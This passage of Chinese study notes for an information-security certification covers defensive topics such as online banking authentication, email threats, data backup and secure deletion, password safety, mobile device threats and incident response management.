网络金融交易安全</h3><p>网上金融交易是指用户通过因特网完成各种网络金融服务和网络电子商务支付。网络金融服务包括账户开户、查询、对帐、行内转账、跨行转账、信贷、网上证券、投资理财等服务项目，用户可以是不出户就完成各种金融业务<br>网络电子商务支付可以使用银行卡或者第三方支付平台完成网络购物，如购买飞机票和火车票等<br>为保障安全，网上金融交易一般不采用简单的账户/口令的验证方式来识别用户身份，多采取双因素身份认证识别用户身份，只有通过身份认证的用户才能通过网络完成各种转账、支付等操作</p><h5 id="网上金融交易常用的安全措施"><a href="#网上金融交易常用的安全措施" class="headerlink" title="网上金融交易常用的安全措施"></a>网上金融交易常用的安全措施</h5><p>U盾(USB-Key)、手机短信验证、口令卡、采用安全超文本传输协议</p><h5 id="U盾-USB-Key"><a href="#U盾-USB-Key" class="headerlink" title="U盾(USB-Key)"></a>U盾(USB-Key)</h5><p>U盾是用于网上电子银行签名和数字认证的工具，它内置微型智能卡处理器，采用非对称加密体制对网上数据进行加密、解密和数字签名<br>用户选择使用U盾后，所有涉及资金对外转移的网银操作，都必须使用U盾才能完成<br>使用U盾时，除了需要将U盾插入计算机，还需要输入设置的口令才能完成身份认证</p><h5 id="手机短信验证"><a href="#手机短信验证" class="headerlink" title="手机短信验证"></a>手机短信验证</h5><p>用户向网络金融交易平台发出交易请求后，网络金融平台通过短信向用户绑定的手机号码发出一次性口令，只有在输入正确的用户口令和短信验证口令后，整个交易才能被确认并完成</p><h5 id="口令卡"><a href="#口令卡" class="headerlink" title="口令卡"></a>口令卡</h5><p>口令卡相当于一种动态的电子银行口令<br>口令卡上以矩阵的形式印有若干字符串，用户在使用电子银行进行对外转账、缴费等支付交易时，电子银行系统就会随机给出一组口令卡坐标用户根据坐标从卡片中找到口令组合并输入<br>只有口令组合输入正确时，用户才能完成相关交易<br>这种口令组合是动态变化的，用户每次使用时输入的口令都不一样，交易结束后即失效，从而防止攻击者窃取用户口令  </p><h5 id="安全超文本传输协议"><a href="#安全超文本传输协议" class="headerlink" title="安全超文本传输协议"></a>安全超文本传输协议</h5><p>安全超文本传输协议是以安全为目标的HTTP通道协议（ Hyper TextTransfer Protocol over Secure Socket Layer,HTTPS),是HTTP协议的安全版<br>HTTPS协议提供了身份验证与加密通信的方法，广泛用于因特网上安全敏感的通信，例如银行网站登录采用的是HTTPS方式，该安全协议可以很大程度上保障用户数据传输的安全</p><h3 id="5-3-电子邮件安全"><a href="#5-3-电子邮件安全" class="headerlink" title="5.3 电子邮件安全"></a>5.3 电子邮件安全</h3><p>随着电子邮件的广泛应用，电子邮件面临的安全威胁越来越多。这些威胁包括邮件地址欺骗、垃圾邮件、邮件病毒、邮件炸弹、邮件拦截、邮箱用户信息泄露等</p><h5 id="电子邮件安全威胁"><a href="#电子邮件安全威胁" class="headerlink" title="电子邮件安全威胁"></a>电子邮件安全威胁</h5><h6 id="邮件地址欺骗"><a href="#邮件地址欺骗" class="headerlink" title="邮件地址欺骗"></a>邮件地址欺骗</h6><p>邮件地址欺骗是黑客攻击和垃圾邮件制造者常用的方法。由于在SMTP协议中，邮件发送者可以指定SMTP发送者的发送账户、发送账户的显示名称、SMTP服务器域名等信息，如果接收端未对这些信息进行认证就可能放过一些刻意伪造的邮件。攻击者可以通过自行搭建SMTP服务器来发送伪造地址的邮件。目前，正规的邮件服务器都有黑名单和反向认证等机制，如检查邮件来源IP、检查邮件发送域、反向DNS查询、登录验证等。伪造邮件一般很难通过严格设置的邮件服务器，但用户还是要对邮件内容涉及敏感信息的邮件来源保持高度警惕</p><h6 id="垃圾邮件"><a href="#垃圾邮件" class="headerlink" title="垃圾邮件"></a>垃圾邮件</h6><p>垃圾邮件是指未经用户许可就强行发送到用户邮箱的电子邮件。垃圾邮件一般具有批量发送的特征，其内容包括赚钱信息、成人广告、商业或个人网站广告、电子杂志、连环信等。垃圾邮件可以分为良性和恶性的。良性垃圾邮件是对收件人影响不大的信息邮件，例如各种宣传广告﹔恶性垃圾邮件是指具有破坏性的电子邮件，例如携带恶意代码的广告</p><h6 id="邮件病毒"><a href="#邮件病毒" class="headerlink" title="邮件病毒"></a>邮件病毒</h6><p>邮件病毒和普通病毒在功能上是一样的，它们主要是通过电子邮件进行传播，因此被称为邮件病毒。一般通过邮件附件发送病毒接收者打开邮件，运行附件会使计算机中病毒</p><h6 id="邮件炸弹"><a href="#邮件炸弹" class="headerlink" title="邮件炸弹"></a>邮件炸弹</h6><p>邮件炸弹指邮件发送者利用特殊的电子邮件软件，在很短的时间内连续不断地将邮件发送给同一收信人，由于用户邮箱存储空间有限，没有多余空间接收新邮件，新邮件将会丢失或被退回，从而造成收件人邮箱功能瘫痪。同时，邮件炸弹会大量消耗网络资源，常常导致网络阻塞，严重时可能影响到大量用户邮箱的使用</p><h5 id="电子邮件安全防护技术"><a href="#电子邮件安全防护技术" class="headerlink" title="电子邮件安全防护技术"></a>电子邮件安全防护技术</h5><p>垃圾邮件过滤技术、邮件加密和解密</p><h6 id="垃圾邮件过滤技术"><a href="#垃圾邮件过滤技术" class="headerlink" title="垃圾邮件过滤技术"></a>垃圾邮件过滤技术</h6><p>垃圾邮件过滤技术是应对垃圾邮件问题的有效手段之一。实时黑白名单过滤和智能内容过滤两种垃圾邮件过滤技术  </p><p>黑白名单过滤</p><p>黑白名单过滤采用最简单直接的方式对垃圾邮件进行过滤。由用户手动添加需要过滤的域名、发信人或发信IP地址等。对于常见的广告型垃圾邮件，此方法的防范效果较为明显。但此种方式属于被动防御，需要大量手工操作，每次需要对黑白名单手工添加</p><p>内容过滤</p><p>内容过滤主要针对邮件标题、邮件附件文件名和邮件附件大小等选项设定关键值。当邮件标题，邮件附件文件名和邮件附件大小等选项被认为是垃圾邮件，邮件系统就会将其直接删除</p><h6 id="邮件加密和解密"><a href="#邮件加密和解密" class="headerlink" title="邮件加密和解密"></a>邮件加密和解密</h6><p>未经加密的邮件很容易被不怀好意的偷窥者看到，如果对带有敏感信息的邮件进行加密和签名，就可以大大提高安全性  </p><p>用于电子邮件加密和签名的软件有许多，GnuPG ( GNU Privacy Guard)是其中常见的一种开源软件  </p><p>GnuPG是一个基于RSA公钥密码体制的邮件加密软件，可以加密邮件以防止非授权者阅读，同时还可以对邮件加上数字签名，使收信人可以确认邮件发送者，并确认邮件没有被篡改  </p><h3 id="5-4-数据安全"><a href="#5-4-数据安全" class="headerlink" title="5.4 数据安全"></a>5.4 数据安全</h3><p>数据备份、数据恢复、数据加密、数据删除</p><h5 id="数据备份"><a href="#数据备份" class="headerlink" title="数据备份"></a>数据备份</h5><p>在系统运行和维护的过程中，常会有一些难以预料的因素导致数据丢失，如天灾人祸、硬件毁损、操作失误等。为确保数据的安全性，需对数据进行备份  </p><p>数据备份是容灾的基础，是为防止系统出现操作失误或系统故障导致数据丢失，而将全部或部分数据集合，从应用主机的硬盘或阵列复制到其它异地存储介质或移动硬盘的过程  </p><p>数据备份方式</p><p>数据备份的方式有多种，传统方式是采用内置或外置的磁带机进行冷备份  </p><p>备份后的磁带机数据保存在安全的位置，这种备份方式恢复数据的时间很长。随着技术的不断发展，海量数据的增加，不少企业开始采用网络备份。网络备份一般通过专业的数据存储管理软件结合相应的硬件和存储设备来实现  </p><p>随着云计算和云技术的发展，越来越多人们常使用云备份的方式来保存重要资料。个人和企业可以将重要数据备份到云服务器上，需要使用时，从云服务器上下载到本地使用  </p><h5 id="数据恢复"><a href="#数据恢复" class="headerlink" title="数据恢复"></a>数据恢复</h5><p>人们在日常生活和工作中会经常遇到数据丢失的情况，比如U盘误格式化、误删除某个文件、计算机硬件出现故障等，因此数据恢复引起越来越多地关注和重视。了解数据恢复原理并掌握一些常用的数据恢复工具，可以恢复各种丢失的数据，挽回用户的损失  </p><p>如果不慎删除硬盘分区信息或者误格式化硬盘，造成系统信息区破坏，无法读取数据资料，首先应关机，不要轻易对硬盘数据资料进行写操作，否则会增加数据恢复的难度。重新开机后，再使用数据恢复工具恢复硬盘上的数据 </p><p>数据恢复方式</p><p>EasyRecovery是一款常用的数据恢复工具，当硬盘受病毒影响、格式化分区、误删除、断电或瞬间电流冲击造成的数据毁坏、程序的非正常操作或系统故障造成的数据毁坏等意外操作时，它可以帮助用户恢复丢失的数据以及重建文件系统  </p><p>EasyRecovery不会向用户的原始驱动器写入任何数据，它的工作原理是在内存中重建文件分区表，然后将数据安全地传输到其他驱动器中。使用数据恢复软件找回数据文件的前提是硬盘中还保留有误删除文件的信息和数据块。当用户误删除文件或者误格式化U盘后，不要在该分区中写入任何文件，否则这些需要恢复的数据就有可能被写入的数据覆盖，恢复数据的难度就会加大。因此，为了恢复误删除的数据，就不能对要修复的分区或硬盘进行新的读写操作</p><h5 id="数据加密"><a href="#数据加密" class="headerlink" title="数据加密"></a>数据加密</h5><p>数据加密是保护数据安全的主要手段之一，可以避免用户在传输或存储重要信息过程中，被第三方窃取信息。常见的数据加密工具可以分为硬件加密和软件加密  </p><p>硬件加密工具直接通过硬件单元，如利用USB接口或者计算机并行口等对数据进行加密，加密后可以有效地保护用户信息、隐私或知识产权  </p><p>软件加密工具主要有文件加密工具、光盘加密工具和磁盘加密工具。</p><p>对单个文件或文件夹进行加密的工具有很多<br>例如，ZIP和RAR等压缩包可以用来加密大文件，压缩时可以设置密码，获取压缩包内的内容需要输入正确的口令才能解压。wPS.Word、PPT、PDF等也可以通过设置口令的方式来加密文件。光盘加密工具可以防止光盘数据被复制，可采用的方法很多。用户可以给光盘添加密码<br>例如，SecureBurn软件可以在正式刻录之前对光盘进行密码保护，然后通过软件内置的刻录功能即可直接获得有密码保护的光盘。用户也可以让文件只能在光盘中运行<br>又如，CD-Protector制作的加密光盘，他人无法通过直接复制文件获得光盘中的重要文件，即使把文件复制到硬盘再运行也会出现出错提示信息而不能使用。光盘加密工具可以对镜像文件进行可视化修改，隐藏光盘镜像文件。此外，还可以放大一般的文件，将普通目录改成文件目录，由此保护光盘中的机密文件和有关隐私的信息。磁盘加密工具则是对磁盘数据进行加密</p><p>磁盘加密工具</p><p>( 1 ) PGPDisk，该软件是美国PGP公司开发的PGP系列安全软件中的一个套件，它的核心思想是通过建立虚拟磁盘来存放并保护加密数据。用户在使用虚拟磁盘文件时需要输入口令，所有存放在虚拟磁盘中的文件都是加密的。如果用户不需要这个虚拟磁盘，可以删除  </p><p>( 2 ) TrueCrypt，这是一款免费开源的加密软件，同时支持多种操作系统。该软件通过在计算机上产生一个或几个虚拟盘来存放敏感数据，每个虚拟磁盘使用高强度密码算法进行加解密，加解密过程全部自动实现，用户只要输入正确的口令，就能读取这些文件，否则不能读取数据</p><p>为了数据安全，加密数据时应尽量保证︰</p><p>(1)加密过程足够强壮并覆盖整个磁盘，包括剩余空间、交换文件等<br>(2)加密密钥足够长，能够抵御暴力破解攻击<br>(3 ）加密密钥自身的机密性能够得到保障，例如用于加密磁盘的密钥从不存储在被加密保护的磁盘中  </p><p>除了采用数据加密保证数据的保密性，用户还可以通过对数据文件添加数字签名来保证数据文件的完整性和真实性，防止数据被篡改或伪造，也可避免可能存在的欺骗和抵赖。一些应用软件可以对数据文件进行签名，如Word、邮件客户端Foxmail等。</p><h5 id="数据删除"><a href="#数据删除" class="headerlink" title="数据删除"></a>数据删除</h5><p>硬盘等存储介质作为数据存储和交换的媒体，在日常工作中使用频繁。这些介质的处置不当，往往使得不法分子有机会通过对存储介质进行数据恢复来窃取曾经存储的重要数据，导致涉密，这成为了信息安全的重要隐患。因此，如何彻底删除计算机数据，防止信息泄露，已成为当今信息安全技术的一个重要研究内容  </p><p>在Windows系统中，系统的文件删除命令是“delete”，使用“delete删除文件以后，文件并没有真正删除，而是被移动到一个称为“回收站”的系统目录中，除非回收站满，或使用“shift+delete”组合键来删除，或当清空回收站时，才真正删除了文件。由于Windows操作系统只考虑了由操作系统本身对系统资源存取，因此无论是在文件分配表(FileAllocation Table ，FAT)还是新技术文件系统(New Technology FileSystem，NTFS)下，操作系统刷除文件的标准都是“对操作系统不可见”，事实上，只是对文件的目录作了删除标记，保证了文件在删除前所占用的空间确实得到释放，而文件实际存放在数据区的内容毫无改变。从以上原理可知，只要数据区没有被破坏，数据就没有完全删除，就存在被恢复的可能  </p><h6 id="硬销毁"><a href="#硬销毁" class="headerlink" title="硬销毁"></a>硬销毁</h6><p>数据硬销毁即破坏性销毁，是指采用物理破坏或化学腐蚀的方法把记录涉密数据的物理载体完全破坏掉，从而从根本上删除数据的销毁方式，是对保护数据不被恢复的安全、彻底的方法。数据硬销毁可分为物理销毁和化学销毁两种方式。</p><p>物理销毁又可分为消磁、熔炉中焚化和熔炼、借助外力粉碎及研磨磁盘表面等方法。物理销毁方法费时、费力，一般只适用于保密要求较高的场合。</p><p>化学销毁是指采用化学药品（比如高腐蚀性的浓盐酸和浓硫酸等腐蚀、溶解、活化及剥离磁盘记录表面的数据销毁方法。化学销毁方法只能由专业人员在特定场所中进行。</p><p>####### 软销毁</p><p>软清除即逻辑销毁，是指通过软件编程实现对数据及其相关信息的反复覆盖擦除，达到不可恢复的安全删除目的，一般情况下，认为低级格式化以后，数据恢复的可能性依然存在</p><p>要保证安全，必须通过多次写入新数据来覆盖旧数据才能真正达到数据安全删除的目的。数据软销毁通常采用数据覆写法。数据覆写是将非保密数据写入以前存有敏感数据的硬盘簇的过程，其技术原理是依据硬盘上的数据都是以二进制的“1”和“O”形式存储的，而使用预先定义的无意义、无规律的信息反复多次覆盖硬盘上原先存储的数据，就无法知道原先的数据，也就达到了销毁数据的目的</p><p>由于经过数据覆写法处理后的硬盘可以循环使用，适用于密级要求不是很高的场合，特别是需要对某一具体文件进行销毁而其他文件不能破坏时，这种方法更为实用。</p><p>现在常见的数据销毁软件，例如BCWipe,Eraser等，主要是针对文件、剩余空间和物理磁盘的销毁。所采用的方式都是通过软件对磁盘进行相应的覆写。数据覆写技术犹如碎纸机，是安全、经济的数据软销毁方式之一。</p><h3 id="5-5-账户口令安全"><a href="#5-5-账户口令安全" class="headerlink" title="5.5 账户口令安全"></a>5.5 账户口令安全</h3><h5 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h5><p>暴力破解又称口令穷举，就是通过计算机对所有可能的口令组合进行穷举尝试。如果攻击者已知用户账户，用户的口令又比较简单，例如简单的数字组合，攻击者使用暴力破解工具可以很快破译口令。因此在一些安全性较高的系统，如网银系统，会限制口令的输入次数，降低暴力破解口令的成功率</p><h5 id="键盘记录木马"><a href="#键盘记录木马" class="headerlink" title="键盘记录木马"></a>键盘记录木马</h5><p>如果用户的计算机被植入键盘记录木马，当用户通过键盘输入口令时，键盘记录木马程序会记住用户输入的口令，然后木马程序通过自带邮件发送功能把记录的口令发送到攻击者指定的邮箱</p><h5 id="屏幕快照木马"><a href="#屏幕快照木马" class="headerlink" title="屏幕快照木马"></a>屏幕快照木马</h5><p>如果用户的计算机被植入屏幕快照木马，木马程序会通过屏幕快照将用户的登录界面连续保存为两张黑白图片，然后通过自带的发信模块将图片发送到指定邮箱。攻击者通过对照图片中鼠标的点击位置，就能破译出用户账号和口令</p><p>用户在设置账户的口令时，应遵循以下原则∶<br>严禁使用空口令<br>严禁使用与账号相同或相似的口令<br>不要设置简单字母和数字组成的口令(如password1)<br>不要设置短于6个字符或仅包含字母或数字的口令<br>不要使用与个人有关的信息作为口令内容，如生日、身份证号码、亲人或者伴侣的姓名、宿舍号等</p><p>为了保证口令的安全性，建议用户每隔一段时间更新一次账号口令。如果用户是在公共场所使用计算机上网，登录账户时不要选择保存口令和自动登录，离开时要清除使用过的记录</p><h3 id="5-6-相关实验"><a href="#5-6-相关实验" class="headerlink" title="5.6 相关实验"></a>5.6 相关实验</h3><h5 id="文档加密和压缩"><a href="#文档加密和压缩" class="headerlink" title="文档加密和压缩"></a>文档加密和压缩</h5><h5 id="浏览器的安全设置"><a href="#浏览器的安全设置" class="headerlink" title="浏览器的安全设置"></a>浏览器的安全设置</h5><h5 id="垃圾邮件过滤"><a href="#垃圾邮件过滤" class="headerlink" title="垃圾邮件过滤"></a>垃圾邮件过滤</h5><p>Foxmail</p><h5 id="数据恢复-1"><a href="#数据恢复-1" class="headerlink" title="数据恢复"></a>数据恢复</h5><p>recuva</p><h2 id="第六章-移动智能终端安全防护"><a href="#第六章-移动智能终端安全防护" class="headerlink" title="第六章 移动智能终端安全防护"></a>第六章 移动智能终端安全防护</h2><h3 id="6-1-移动智能终端"><a href="#6-1-移动智能终端" class="headerlink" title="6.1 移动智能终端"></a>6.1 移动智能终端</h3><h5 id="移动智能终端的定义"><a href="#移动智能终端的定义" class="headerlink" title="移动智能终端的定义"></a>移动智能终端的定义</h5><p>移动智能终端是指具有独立操作系统、可安装应用程序、使用无线局域网或移动通信网访问因特网的设备，其典型代表如智能手机和平板电脑</p><h5 id="移动智能终端的结构"><a href="#移动智能终端的结构" class="headerlink" title="移动智能终端的结构"></a>移动智能终端的结构</h5><p><img src="/2022/02/10/NISP/6.1-1.png"></p><h5 id="移动智能终端的分类"><a href="#移动智能终端的分类" class="headerlink" title="移动智能终端的分类"></a>移动智能终端的分类</h5><p>智能手机、平板电脑</p><h5 id="移动智能终端的功能"><a href="#移动智能终端的功能" class="headerlink" title="移动智能终端的功能"></a>移动智能终端的功能</h5><p>能够访问不同模式的移动通信网络<br>能够通过不同的网络接口访问因特网<br>具有开放的API接口<br>支持多任务<br>具有哦多媒体功能具有GPS导航功能  </p><h5 id="相关问题-3"><a href="#相关问题-3" class="headerlink" title="相关问题"></a>相关问题</h5><p>移动智能终端具有哪些特点？</p><p>(1)具备一个具有开放性的操作系统平台,可以安装更多的应用程序,从而使智能终端的功能得到无限扩充<br>(2)具备PAD功能,包括PIM(个人信息管理)、日程记事、任务安排、多媒体应用、浏览网页等功能<br>(3)具备无线接入互联网的能力,即需要支持GSM网络下的GPRS或者CDMA网络下的CDMA1X或3G网络<br>(4)功能强大,扩展性强,支持多个第三方软件</p><h3 id="6-2-移动智能终端安全威胁"><a href="#6-2-移动智能终端安全威胁" class="headerlink" title="6.2 移动智能终端安全威胁"></a>6.2 移动智能终端安全威胁</h3><h5 id="安全形势"><a href="#安全形势" class="headerlink" title="安全形势"></a>安全形势</h5><p>(1）智能终端操作系统敏感权限滥用<br>(2)应用软件难溯源<br>(3）智能终端操作系统漏洞<br>(4）智能终端操作系统后门  </p><h5 id="安全威胁"><a href="#安全威胁" class="headerlink" title="安全威胁"></a>安全威胁</h5><p>(1)伪基站攻击<br>(2)二维码扫描<br>(3)移动终端遗失<br>(4)手机病毒<br>(5）恶意扣费软件  </p><h6 id="伪基站攻击"><a href="#伪基站攻击" class="headerlink" title="伪基站攻击"></a>伪基站攻击</h6><p>“伪基站”即假基站，设备一般由主机和笔记本电脑或手机组成，通过短信群发器、短信发信机等相关设备能够搜取以其为中心、一定半径范围内的手机卡信息，利用2G移动通信的缺陷，通过伪装成运营商的基站，冒用他人手机号码强行向用户手机发送诈骗、广告推销等短信息</p><p>伪基站工作流程</p><p><img src="/2022/02/10/NISP/6.2-1.png"></p><h6 id="二维码扫描"><a href="#二维码扫描" class="headerlink" title="二维码扫描"></a>二维码扫描</h6><p>二维码（Two-Dimensional Code,TDC）是指在一维条码的基础上扩展出来的另一种具有可读性的条码。二维码使用黑白色矩形图案表示二进制数据</p><p>二维码的基本特点</p><p>(1）信息量大，编码范围广<br>(2）容错能力强，译码可靠性高<br>(3）编译简便，成本低</p><p>二维码的安全问题</p><p>1、成为病毒木马、钓鱼网站传播新渠道<br>2、二维码信息更容易泄露<br>3、对二维码的监管力度不够<br>4、二维码成为违法信息传播新方式<br>5、二维码与移动支付结合，成为金融诈骗新手段  </p><h6 id="移动终端遗失"><a href="#移动终端遗失" class="headerlink" title="移动终端遗失"></a>移动终端遗失</h6><p>手机丢失后，先做这5件事</p><p>1、致电运营商挂失手机号<br>2、致电银行冻结手机网银<br>3、微信用户登录110.qq.com冻结账号<br>4、修改微博、微信、QQ等密码<br>5、到手机运营商处补手机卡  </p><h6 id="手机病毒"><a href="#手机病毒" class="headerlink" title="手机病毒"></a>手机病毒</h6><p>手机病毒是一种具有传染性、破坏性的手机程序。手机病毒可通过短信、彩信、电子邮件和蓝牙等方式进行传播，常常伪装成手机软件和系统程序诱骗用户下载</p><p>手机病毒的危害</p><p>1、窃取用户信息<br>2、用户信息丢失<br>3、破坏手机硬件<br>4、发送垃圾信息</p><h6 id="恶意扣费软件"><a href="#恶意扣费软件" class="headerlink" title="恶意扣费软件"></a>恶意扣费软件</h6><p>恶意扣费软件是指没有对用户进行任何提示，通过发送短信或联网等方式强制扣除用户手机话费的软件。</p><h5 id="相关问题-4"><a href="#相关问题-4" class="headerlink" title="相关问题"></a>相关问题</h5><p>伪基站发送的垃圾短信中发信人号码是可以任意伪造的吗?</p><p>伪基站的主要特点，是可以随意更改发送的号码，可以选择尾号较好的号码，还可以使用尾数为10086或95588等号码，使手机用户误以为真的是移动公司或工商银行发送的短信</p><p>如果只是扫描了位置来源的二维码，会造成手机中毒吗?</p><p>二维码本身是没有病毒的,含有病毒的是二维码中的信息指向的网站或软件安装包等。只要在扫描完之后不盲目安装或访问网站,确保手机中安装有360等安全软件,就可以杜绝中毒、扣费等问题。</p><h3 id="6-3-移动智能终端的安全使用"><a href="#6-3-移动智能终端的安全使用" class="headerlink" title="6.3 移动智能终端的安全使用"></a>6.3 移动智能终端的安全使用</h3><h5 id="移动智能终端安全使用建议"><a href="#移动智能终端安全使用建议" class="headerlink" title="移动智能终端安全使用建议"></a>移动智能终端安全使用建议</h5><p>1、注意隐私权限访问请求<br>2、慎重扫描二维码<br>a、不要“见码就扫”<br>b、不要随意“晒码”和丢弃含有二维码的票据<br>3、从正规渠道下载应用<br>4、安装安全防护软件<br>5、定期备份<br>6、不要登录到不安全的无线网络<br>7、尽量避免访问财务或银行信息<br>8、在网上浏览时不要选择“记住我”<br>9、清空历史记录和缓存内容<br>10、启动用户认证<br>11、谨慎对待陌生信息<br>12、注意安全管理终端</p><h5 id="相关问题-5"><a href="#相关问题-5" class="headerlink" title="相关问题"></a>相关问题</h5><p>与台式机相比，移动智能终端面临的安全问题有哪些特点?  </p><p>移动智能终端尺寸小，可移动性强。所处环境复杂而不确定，存储的信息大多是个人隐私信息。</p><p>为了防止因手机丢失而造成信息泄密，可以对手机进行那些设置？</p><p>为手机设置开机密码，安取下单独绑定手机的账户和密码，比如支付宝，qq，微信，尽量不要直接绑定登录修改成输入密码的方式。装手机安全软件</p><h3 id="6-4-相关实验"><a href="#6-4-相关实验" class="headerlink" title="6.4 相关实验"></a>6.4 相关实验</h3><p>……</p><p>第三方手机安全应用的主要功能</p><p>1、手机系统垃圾一件清理、优化启动选项，减小手机存储负担<br>2、拦截电话信息，减少电话和短信的骚扰<br>3、流量监控<br>4、手机节点模式管理5、程序管理<br>6、隐私权限保护<br>7、密码保护器，牢记账号密码<br>8、程序锁<br>9、加密隐藏短信、通话记录和照片等信息，保护隐私  </p><h2 id="第七章-信息安全管理"><a href="#第七章-信息安全管理" class="headerlink" title="第七章 信息安全管理"></a>第七章 信息安全管理</h2><h3 id="7-1-信息安全管理概述"><a href="#7-1-信息安全管理概述" class="headerlink" title="7.1 信息安全管理概述"></a>7.1 信息安全管理概述</h3><p>信息安全管理( Information Security Management, ISM)，是管理者为实现信息安全目标（如信息资产的CIA等特性、业务运行的持续性）而进行计划、组织、指挥、协调和控制的一系列活动。它的管理对象是组织的信息及相关资产，包括信息、人员、软件等，同时还包括信息安全目标、信息安全组织架构、信息安全策略规则等。管理的目的是保障组织的业务正常运转  </p><h5 id="信息安全管理的关键因素"><a href="#信息安全管理的关键因素" class="headerlink" title="信息安全管理的关键因素"></a>信息安全管理的关键因素</h5><p>1.组织的活动能够反映组织的业务目标<br>2.组织所有级别的管理者能够给予信息安全实质性的、可见的支持和承诺  3.组织的管理者对信息安全需求、信息安全风险、风险评估及风险管理有正确深入的理解<br>4.向所有管理者、员工和其他相关方提供有效的信息安全宣传以提升信息安全意识<br>5.向所有管理者、员工和其他相关方分发、宣贯实行信息安全方针、策略和标准。使全员都对组织的信息安全方针、策略、标准的要求有深入的理解，是成功实施信息安全管理的重要基础<br>6.管理者为信息安全建设提供足够的资金。这是信息安全管理成功实施的必要保障<br>7.建立有效的信息安全事件管理过程<br>8.建立有效的信息安全测量体系  </p><h5 id="相关问题-6"><a href="#相关问题-6" class="headerlink" title="相关问题"></a>相关问题</h5><p>简述信息安全管理的概念和作用</p><p>信息安全管理是管理者为实现信息安全目标（如信息资产的CIA等特性、业务运行的持续性）而进行计划、组织、指挥、协调和控制的一系列活动<br>作用是保障组织的业务正常运转。</p><h3 id="7-2-信息安全风险管理"><a href="#7-2-信息安全风险管理" class="headerlink" title="7.2 信息安全风险管理"></a>7.2 信息安全风险管理</h3><p>信息系统不可能达到绝对安全，但可以通过安全风险(以下简称”风险”)控制，来实现符合个人或单位目标的一定程度的安全。信息安全管理的核心思想是风险管理，关键在于如何控制、化解和规避风险。风险管理是信息安全管理的基本方法，通过对单位信息资产实施一定的安全管理措施来保障信息的保密性、完整性和可用性</p><h5 id="信息风险"><a href="#信息风险" class="headerlink" title="信息风险"></a>信息风险</h5><p>风险是一种潜在的、负面的东西，处于未发生的状态，它是指遭受损害或损失的可能性。因此，风险一方面客观存在，另一方面其发生的时间具有不确定性，风险一旦发生，将会产生损失。风险强调的是损害的潜在可能性，而不是事实上的损害，风险是不能消除殆尽的</p><p>威胁、脆弱性、影响、资产</p><p><img src="/2022/02/10/NISP/7.2-1.png"></p><h5 id="风险管理"><a href="#风险管理" class="headerlink" title="风险管理"></a>风险管理</h5><p>风险管理是信息安全管理的基本方法，通过对组织信息资产实施一定的安全管理措施来保障信息的保密性、完整性和可用性。</p><p>风险管理是组织机构识别、评估风险并采取相关活动，将风险降低到一个可接受级别的过程。它是单位管理活动的一部分，其管理的主要对象就是风险。以风险为驱动的信息安全管理，其核心就是通过识别风险、选择对策、消减风险</p><p>风险管理基本步骤</p><p>按照GB/Z 24364-2009《信息安全风险管理指南》，信息安全风险管理有四个基本步骤:</p><p>1.背景建立<br>2.风险评估<br>3.风险处理<br>4.批准监督</p><p>1.风险管理是一个动态发展、不断循环的过程，一次风险管理完成后，因为新的变化引起新的风险，或者因为业务本身的要求，都需要进入新一轮风险管理周期<br>2．以体系化的方式实施信息安全管理，才能实现并保持一定的信息安全水平</p><h3 id="7-3-信息安全事件与应急响应"><a href="#7-3-信息安全事件与应急响应" class="headerlink" title="7.3 信息安全事件与应急响应"></a>7.3 信息安全事件与应急响应</h3><h5 id="信息安全事件"><a href="#信息安全事件" class="headerlink" title="信息安全事件"></a>信息安全事件</h5><p>信息安全事件，是指由于自然或者人为以及软硬件本身缺陷或故障的原因，对信息系统造成危害，或在信息系统内发生对社会造成负面影响的事件。至今尚没有任何一种信息安全策略或防护措施，能够对信息及信息系统提供绝对的保护，以完全避免信息安全事件的发生。对信息安全事件进行有效管理和响应，最小化事件所造成的损失和负面影响，是组织信息安全战略的一部分。应急响应是信息安全事件管理的重要内容</p><p>信息安全事件可以是故意、过失或非人为原因引起的，可以分为有害程序事件、网络攻击事件、信息破坏事件、信怠内容安全事件、设备设施故障、灾害性事件和其他信息安全事件等7个基本分类。</p><p>对信息安全事件的分级主要考虑三个要素:<br>1.信息系统的重要程度<br>2.系统损失<br>3.社会影响</p><h5 id="信息安全应急响应"><a href="#信息安全应急响应" class="headerlink" title="信息安全应急响应"></a>信息安全应急响应</h5><p>信息安全应急响应，是指一个组织为了应对各种安全意外事件的发生所采取的防范措施，既包括预防性措施，也包括事件发生后的应对措施。实践证明，现实中难以发现和抵御所有威胁，安全事件具有突发性、复杂性，所以需要建立信息系统安全事件的快速响应机制。应急响应工作的主要任务是做好预先防范，安全事件发生后，尽快做出正确反应，及时阻止事件的继续发展，并减少损失，使系统恢复正常运行，同时采取追踪攻击者及必要的法律行动  </p><p>信息安全应急响应作用</p><p>未雨绸缪、亡羊补牢</p><h5 id="应急响应组织"><a href="#应急响应组织" class="headerlink" title="应急响应组织"></a>应急响应组织</h5><p>应急响应组织是专门处理安全事件的组织。<br>常用的名字是∶<br>1.计算机网络安全事件应急组<br>2.计算机安全事件响应组( Computer Security Incident Response Team,CSIRT)<br>3.信息安全事件响应组( Information Security Incident Response Team,ISIRT)<br>4.事件响应组( Incident esponse Team, IRT)<br>通常，应急响应组织由管理、业务、技术和行政后勤等人员组成</p><p>组织建立的内部应急响应组织应与外部的国内外应急响应组织、相关管理部门、设备设施及服务提供商(如电力供应、通信服务等)、利益相关方和新闻媒体等保持联系和协作，以确保在发生信息安全事件时能及时通报准确情况，并获得支持</p><p>我国的应急响应组织</p><p>1.国家计算机网络应急技术处理协调中心(National Computer Network Emergency Response Technical Team/CoordinationCenter of China,CN-CERT/CC )<br>2．国家计算机病毒应急处理中心<br>3．国家计算机网络入侵防范中心  </p><p>信息安全应急响应管理过程</p><p>应急响应方法和过程并不是唯一的，通常可以将应急响应管理过程分为如下6个阶段︰<br>1.准备<br>2.检测<br>3.遏制<br>4.根除<br>5.恢复<br>6.跟踪总结  </p><h3 id="7-4-灾难备份"><a href="#7-4-灾难备份" class="headerlink" title="7.4 灾难备份"></a>7.4 